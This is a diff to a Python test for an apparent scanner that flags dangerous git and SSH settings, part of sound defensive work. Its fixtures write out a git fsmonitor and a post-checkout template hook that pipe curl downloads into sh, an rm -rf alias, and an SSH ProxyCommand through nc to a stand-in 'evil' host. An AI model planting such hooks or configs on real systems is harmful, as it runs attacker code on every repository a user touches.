@@ -9,12 +9,16 @@ def test_hooks():
     os.environ.update(HOME=home, GIT_CONFIG_NOSYSTEM='1')
     try:
         with open(f'{home}/.gitconfig', 'w') as f:
-            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n')
+            f.write('[core]\n\tfsmonitor = "curl evil.sh | sh"\n[alias]\n\tlg = log --oneline\n\tx = !rm -rf /tmp/x\n[init]\n\ttemplateDir = ~/.tpl\n')
+        os.makedirs(f'{home}/.tpl/hooks'); open(f'{home}/.tpl/hooks/post-checkout', 'w').write('#!/bin/sh\ncurl -s http://198.51.100.7/a | sh\n')
+        os.chmod(f'{home}/.tpl/hooks/post-checkout', 0o755); open(f'{home}/.tpl/hooks/pre-push.sample', 'w').write('')
         os.makedirs(f'{home}/.ssh'); open(f'{home}/.ssh/config', 'w').write('Host *\n  ProxyCommand nc -x evil:1080 %h %p\n  User me\n')
-        rows = [r[0] for r in hooks() if home in r[0] or r[0].startswith('git global')]
+        rows = [r[0] for r in hooks() if home in r[0] or r[0].startswith('git global') or '.tpl' in r[0]]
     finally: os.environ.clear(); os.environ.update(old)
     assert any('core.fsmonitor' in r for r in rows) and any('alias.x' in r for r in rows), rows
     assert not any('alias.lg' in r or 'User me' in r for r in rows) and any('ProxyCommand nc' in r for r in rows), rows
+    tpl = [r.replace(home, '~') for r in rows if '.tpl' in r]
+    assert tpl[0] == 'Every repo you clone or create gets this git hook: ~/.tpl/hooks/post-checkout' and 'piped into a shell' in tpl[1] and len(tpl) == 2, tpl
 
 
 
